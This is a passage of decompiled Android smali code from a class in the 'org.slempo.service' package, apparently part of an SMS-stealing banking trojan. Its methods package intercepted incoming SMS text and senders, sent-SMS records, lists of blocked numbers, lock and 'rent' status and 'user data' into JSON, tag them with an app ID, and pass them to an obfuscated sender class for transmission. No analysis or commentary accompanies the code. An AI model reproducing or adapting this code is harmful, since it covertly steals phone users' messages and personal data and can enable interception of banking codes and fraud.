    .param p0, "context"    # Landroid/content/Context;
    .param p1, "text"    # Ljava/lang/String;
    .param p2, "from"    # Ljava/lang/String;

    .prologue
    .line 130
    .line 131
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 130
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 133
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 134
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "listened incoming sms"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 135
    const-string v4, "from"

    invoke-virtual {v1, v4, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 136
    const-string v4, "text"

    invoke-virtual {v1, v4, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 137
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 138
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 139
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_LISTENED_INCOMING_SMS:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 138
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 140
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 144
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 141
    :catch_0
    move-exception v0

    .line 142
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendLockStatus(Landroid/content/Context;Ljava/lang/String;)V
    .locals 7
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "status"    # Ljava/lang/String;

    .prologue
    .line 234
    .line 235
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 234
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 237
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 238
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "lock status"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 239
    const-string v4, "status"

    invoke-virtual {v1, v4, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 240
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 241
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 242
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONFIRMATION:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 241
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 243
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 247
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 244
    :catch_0
    move-exception v0

    .line 245
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendNotificationSMSSentData(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "number"    # Ljava/lang/String;
    .param p2, "text"    # Ljava/lang/String;

    .prologue
    .line 185
    .line 186
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 185
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 188
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 189
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "sms sent notification"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 190
    const-string v4, "number"

    invoke-virtual {v1, v4, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 191
    const-string v4, "text"

    invoke-virtual {v1, v4, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 192
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 193
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 194
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONFIRMATION:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 193
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 195
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 199
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 196
    :catch_0
    move-exception v0

    .line 197
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendRentStatus(Landroid/content/Context;Ljava/lang/String;)V
    .locals 7
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "status"    # Ljava/lang/String;

    .prologue
    .line 168
    .line 169
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 168
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 171
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 172
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "rent status"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 173
    const-string v4, "rent status"

    invoke-virtual {v1, v4, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 174
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 175
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 176
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONFIRMATION:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 175
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 177
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 181
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 178
    :catch_0
    move-exception v0

    .line 179
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendStartBlockingNumbersData(Landroid/content/Context;Ljava/util/HashSet;)V
    .locals 7
    .param p0, "context"    # Landroid/content/Context;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/util/HashSet",
            "<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation

    .prologue
    .line 203
    .line 204
    .local p1, "numbersSet":Ljava/util/HashSet;, "Ljava/util/HashSet<Ljava/lang/String;>;"
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 203
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 206
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 207
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "blocking numbers"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 208
    const-string v4, "numbers"

    new-instance v5, Lorg/json/JSONArray;

    invoke-direct {v5, p1}, Lorg/json/JSONArray;-><init>(Ljava/util/Collection;)V

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 209
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 210
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 211
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONFIRMATION:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 210
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 212
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 216
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 213
    :catch_0
    move-exception v0

    .line 214
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendUnblockAllNumbersData(Landroid/content/Context;)V
    .locals 7
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 219
    .line 220
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 219
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 222
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 223
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "unblock all numbers"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 224
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 225
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 226
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONFIRMATION:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 225
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 227
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 231
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 228
    :catch_0
    move-exception v0

    .line 229
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method private static sendUserData(Landroid/content/Context;Lorg/json/JSONObject;)V
    .locals 7
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "data"    # Lorg/json/JSONObject;

    .prologue
    .line 24
    .line 25
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 24
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 27
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 28
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "user data"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 29
    const-string v4, "data"

    invoke-virtual {v1, v4, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 30
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 31
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 32
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_USER_DATA:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 31
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 33
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 37
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 34
    :catch_0
    move-exception v0

    .line 35
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method
